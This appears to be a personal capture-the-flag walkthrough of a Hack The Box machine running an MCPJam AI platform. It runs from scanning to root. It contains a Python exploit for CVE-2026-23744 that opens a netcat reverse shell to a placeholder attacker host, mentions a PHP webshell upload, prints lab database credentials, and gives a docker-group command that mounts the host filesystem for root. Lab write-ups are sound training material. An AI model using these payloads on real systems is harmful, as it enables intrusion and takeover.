#MCPJam 
## vuxscan

```vuxscan

=== vuxScan results for 10.129.245.50 ===
10.129.245.50    22     open
10.129.245.50    80     open
10.129.245.50    443    open
10.129.245.50    3552   open
```


## Nmap

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



Also a port 3552 which runs a golang http server
```


### Login Found in port 3552 

![[Pasted image 20260804111107.png]]



### Subdomain Enum

Found 2 
 - bin
 - mcp

## Vhost mcp.kobold.htb

AI PLatform 

![[Pasted image 20260804111117.png]]

**Version identified v1.4.2**

![[Pasted image 20260804111135.png]]


## Exploit

[[CVE-2026-23744]]

```CVE-2026-23744
import requests
import json


target = "https://TARGET"
ip = "ATTACKER_IP"
port = "ATTACKER_PORT"

url = f'{target}/api/mcp/connect'


data = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{ip}",
            f"{port}",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)
```


# Got The shell

![[Pasted image 20260804111727.png]]


**Cant Evelate Privilage from Ben**

### Further Enum leads to find 

![[Pasted image 20260804114136.png]]

![[Pasted image 20260804114155.png]]

[[CVE-2025-64714]]

**Got the LFI Working so uploaded the PHP webshell with the already Working RCE and Got the shell as `nobody`**

![[Pasted image 20260804114856.png]]


**By reading /srv/cfg/conf.php** we get

```creds

;dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
;tbl = "privatebin_"    ; table prefix
;usr = "privatebin"
;pwd = "Z3r0P4ss"

dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```



Logged into The onyl login page we have using the cred 

```
arcane : ComplexP@sswordAdmin1928
```


# Root

**Switched to the docker grp**

```
newgrp docker
```

## Evelated Privilage using this command ⭐

```
docker run -it --rm -v /:/mnt/host mysql chroot /mnt/host /bin/bash
```


![[Pasted image 20260804154716.png]]


pwned !!!